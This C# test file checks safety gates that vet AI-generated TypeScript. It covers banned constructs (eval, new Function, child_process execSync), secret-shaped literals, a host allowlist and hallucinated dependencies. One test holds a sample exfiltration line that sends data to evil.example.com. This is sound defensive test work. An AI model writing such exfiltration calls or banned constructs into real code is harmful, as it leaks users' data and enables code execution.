using AgentCodeGen.Api.Abstractions;
using AgentCodeGen.Api.Domain;
using AgentCodeGen.Api.Gates;
using AwesomeAssertions;
using NSubstitute;

namespace AgentCodeGen.Api.Tests;

public class CodeGateTests
{
    private static CodeArtifact Artifact(string code, params string[] dependencies) =>
        new("typescript", code, dependencies, "why", []);

    [Theory]
    [InlineData("const x = eval('1+1');")]
    [InlineData("const f = new Function('return 1');")]
    [InlineData("import { execSync } from 'child_process';")]
    public async Task BannedConstructsGate_FlagsDangerousCode(string code)
    {
        var result = await new BannedConstructsGate().CheckAsync(Artifact(code));

        result.Passed.Should().BeFalse();
    }

    [Fact]
    public async Task BannedConstructsGate_PassesCleanCode()
    {
        var result = await new BannedConstructsGate().CheckAsync(
            Artifact("const response = await fetch(url); const data = await response.json();"));

        result.Passed.Should().BeTrue();
    }

    [Theory]
    [InlineData("const key = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789';")]
    [InlineData("const aws = 'AKIAIOSFODNN7EXAMPLE';")]
    [InlineData("headers: { Authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature' }")]
    public async Task SecretScanGate_FlagsSecretShapedLiterals(string code)
    {
        var result = await new SecretScanGate().CheckAsync(Artifact(code));

        result.Passed.Should().BeFalse();
    }

    [Fact]
    public async Task SecretScanGate_PassesCodeWithoutSecrets()
    {
        var result = await new SecretScanGate().CheckAsync(
            Artifact("const url = 'https://collectionapi.metmuseum.org/public/collection/v1/search';"));

        result.Passed.Should().BeTrue();
    }

    [Fact]
    public async Task HostAllowlistGate_PassesMetMuseumHosts()
    {
        var result = await new HostAllowlistGate().CheckAsync(
            Artifact("fetch('https://collectionapi.metmuseum.org/public/collection/v1/search?q=x'); // https://metmuseum.github.io/"));

        result.Passed.Should().BeTrue();
    }

    [Fact]
    public async Task HostAllowlistGate_FlagsUnknownHosts()
    {
        var result = await new HostAllowlistGate().CheckAsync(
            Artifact("fetch('https://evil.example.com/exfil?d=' + data);"));

        result.Passed.Should().BeFalse();
        result.Detail.Should().Contain("evil.example.com");
    }

    [Fact]
    public async Task DependencyGate_PassesWhenThereAreNoDependencies()
    {
        var registry = Substitute.For<IPackageRegistry>();

        var result = await new DependencyGate(registry).CheckAsync(Artifact("code"));

        result.Passed.Should().BeTrue();
        await registry.DidNotReceiveWithAnyArgs().ExistsAsync(default!, default);
    }

    [Fact]
    public async Task DependencyGate_FlagsPackagesMissingFromTheRegistry()
    {
        var registry = Substitute.For<IPackageRegistry>();
        registry.ExistsAsync("left-pad", Arg.Any<CancellationToken>()).Returns(true);
        registry.ExistsAsync("totally-hallucinated-pkg", Arg.Any<CancellationToken>()).Returns(false);

        var result = await new DependencyGate(registry)
            .CheckAsync(Artifact("code", "left-pad", "totally-hallucinated-pkg"));

        result.Passed.Should().BeFalse();
        result.Detail.Should().Contain("totally-hallucinated-pkg");
    }
}
